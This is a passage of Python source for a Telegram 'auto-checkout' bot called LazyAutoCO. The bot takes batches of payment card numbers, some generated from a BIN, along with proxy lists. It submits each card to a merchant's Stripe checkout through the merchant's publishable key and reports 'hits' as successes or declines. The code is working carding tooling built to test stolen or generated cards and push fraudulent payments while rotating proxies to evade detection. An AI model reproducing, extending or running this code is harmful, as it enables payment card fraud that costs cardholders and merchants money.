        for i, card in enumerate(cards):
            try:
                if status_msg:
                    await status_msg.edit_text(f"🔄 Processing card {i+1}/{len(cards)}...")
                
                # Check if we have publishable key
                if not checkout_info.publishable_key:
                    results.append(HitResult(
                        card=card,
                        status="error",
                        message="no_publishable_key"
                    ))
                    continue
                
                # Create payment method
                pm_id = await self.stripe_api.create_payment_method(
                    card, 
                    address, 
                    checkout_info.publishable_key,
                    user_id
                )
                
                if not pm_id:
                    results.append(HitResult(
                        card=card,
                        status="error",
                        message="payment_method_failed"
                    ))
                    continue
                
                # If we have payment intent ID, confirm it
                if checkout_info.payment_intent_id:
                    success, message, pi_id = await self.stripe_api.confirm_payment_intent(
                        checkout_info.payment_intent_id,
                        pm_id,
                        checkout_info.publishable_key,
                        user_id
                    )
                    
                    if success:
                        results.append(HitResult(
                            card=card,
                            status="success",
                            message=message,
                            payment_intent_id=pi_id
                        ))
                    else:
                        results.append(HitResult(
                            card=card,
                            status="decline",
                            message=message
                        ))
                else:
                    # Without payment intent ID, we can only create payment method
                    results.append(HitResult(
                        card=card,
                        status="pending",
                        message="payment_method_created"
                    ))
                
                # Delay between cards
                await asyncio.sleep(2)
                
            except Exception as e:
                logger.error(f"Error processing card: {e}")
                results.append(HitResult(
                    card=card,
                    status="error",
                    message=str(e)[:50]
                ))
        
        return results
    
    async def process_cards(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Process cards from /co command"""
        user_id = update.effective_user.id
        cards = context.user_data.get('cards', [])
        checkout_info = context.user_data.get('checkout_info')
        address = context.user_data.get('address')
        url = context.user_data.get('url', '')
        
        if not checkout_info:
            checkout_info = CheckoutInfo(url=url)
        
        await update.callback_query.edit_message_text(
            f"🔄 Processing {len(cards)} cards...",
            parse_mode='Markdown'
        )
        
        results = await self.process_cards_real(user_id, checkout_info, cards, address, None)
        
        await self.send_formatted_results(update, context, checkout_info, results, len(cards))
    
    async def send_formatted_results(self, update: Update, context: ContextTypes.DEFAULT_TYPE, 
                                     checkout_info: CheckoutInfo, results: List[HitResult], generated_count: int):
        """Send formatted results to user"""
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        username = update.effective_user.username or "user"
        
        # Header
        text = [
            "╔════════════════════════════╗",
            "║     🤖 *LazyAutoCO*        ║",
            "╚════════════════════════════╝",
            "",
            f"*Merchant:* {checkout_info.merchant or checkout_info.domain}",
            f"*Product:* {checkout_info.product or 'N/A'}",
            f"*Amount:* {checkout_info.amount_formatted}",
            f"*Cards:* {len(results)}" + (f" (Generated from BIN)" if generated_count > 0 else ""),
            "",
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        ]
        
        # Individual card results
        success_count = 0
        for i, result in enumerate(results, 1):
            status_icon = "✅" if result.status == "success" else "❌" if result.status == "decline" else "⚠️"
            text.append("")
            text.append(f"*Card #{i}:*")
            text.append(f"`{result.card.full}`")
            text.append(f"*Message:* `{result.message}`")
            
            if result.status == "success":
                success_count += 1
                if result.payment_intent_id:
                    text.append(f"*ID:* `{result.payment_intent_id[-8:]}`")
            
            if i < len(results):
                text.append("")
        
        # Footer
        text.extend([
            "",
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            f"*All cards processed*",
            f"*Success:* {success_count}/{len(results)}",
            f"*Time:* {timestamp}",
            "",
            f"*Req By:* @{username}"
        ])
        
        result_text = "\n".join(text)
        
        # Split if too long
        if len(result_text) > 4096:
            parts = [result_text[i:i+4096] for i in range(0, len(result_text), 4096)]
            for part in parts:
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=part,
                    parse_mode='Markdown'
                )
        else:
            if hasattr(update, 'callback_query') and update.callback_query:
                await update.callback_query.message.reply_text(result_text, parse_mode='Markdown')
            else:
                await update.message.reply_text(result_text, parse_mode='Markdown')
        
        context.user_data.clear()
    
    async def handle_text(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle text messages"""
        user_id = update.effective_user.id
        text = update.message.text
        
        state = context.user_data.get('state')
        
        if state == WAITING_EMAIL:
            # Save email
            if '@' in text and '.' in text:
                if user_id not in self.user_data:
                    self.user_data[user_id] = {}
                self.user_data[user_id]['email'] = text.strip()
                
                context.user_data['state'] = None
                await update.message.reply_text(
                    f"✅ Email saved: `{text.strip()}`\n\n"
                    f"You can now use /co or /cb commands",
                    parse_mode='Markdown'
                )
            else:
                await update.message.reply_text("❌ Invalid email format. Try again:")
        
        elif state == WAITING_PROXY_LIST:
            # Parse multiple proxies
            lines = text.strip().split('\n')
            added = 0
            invalid = 0
            
            for line in lines[:50]:  # Max 50 proxies
                success, _ = await self.add_single_proxy(user_id, line)
                if success:
                    added += 1
                else:
                    invalid += 1
            
            if added > 0:
                context.user_data['state'] = None
                await update.message.reply_text(
                    f"✅ Added {added} proxies, {invalid} invalid\n"
                    f"Use /testproxies to check which ones work",
                    parse_mode='Markdown'
                )
            else:
                await update.message.reply_text("❌ No valid proxies found")
        
        elif state == WAITING_CARDS:
            # Parse cards
            url = context.user_data.get('url')
            if not url:
                await update.message.reply_text("❌ Session expired. Use /co again")
                return
            
            lines = text.strip().split('\n')
            cards = []
            invalid = []
            
            for line in lines[:10]:
                card = Card.from_string(line)
                if card:
                    cards.append(card)
                else:
                    invalid.append(line)
            
            if not cards:
                await update.message.reply_text(
                    "❌ No valid cards found. Format: `4111111111111111|12|25|123`",
                    parse_mode='Markdown'
                )
                return
            
            # Create confirmation keyboard
            keyboard = [
                [
                    InlineKeyboardButton("✅ Process", callback_data="process_cards"),
                    InlineKeyboardButton("❌ Cancel", callback_data="cancel")
                ]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            context.user_data['cards'] = cards
            context.user_data['invalid_count'] = len(invalid)
            
            summary = f"*URL:* `{url}`\n"
            summary += f"*Valid cards:* {len(cards)}\n"
            if invalid:
                summary += f"*Invalid lines:* {len(invalid)}\n\n"
            summary += "\nProcess these cards?"
            
            await update.message.reply_text(
                summary,
                parse_mode='Markdown',
                reply_markup=reply_markup
            )
    
    async def button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle button callbacks"""
        query = update.callback_query
        await query.answer()
        
        if query.data == "cancel":
            context.user_data.clear()
            await query.edit_message_text("❌ Cancelled")
            return
        
        if query.data == "process_cards":
            await self.process_cards(update, context)
    
    async def run(self):
        """Run the bot"""
        await self.app.initialize()
        await self.app.start()
        
        print(f"✅ Bot started! Session auto-revoke enabled")
        print(f"👤 Admin ID: {ADMIN_IDS[0]}")
        print("Press Ctrl+C to stop.")
        
        await self.app.updater.start_polling()
        
        try:
            while True:
                await asyncio.sleep(1)
        except KeyboardInterrupt:
            pass
        finally:
            await self.shutdown()
    
    async def shutdown(self):
        """Clean shutdown"""
        await self.app.updater.stop()
        await self.app.stop()
        await self.app.shutdown()

# ============= MAIN =============
async def main():
    """Main entry point"""
    bot = CheckoutBot(BOT_TOKEN)
    await bot.run()

if __name__ == "__main__":
    asyncio.run(main())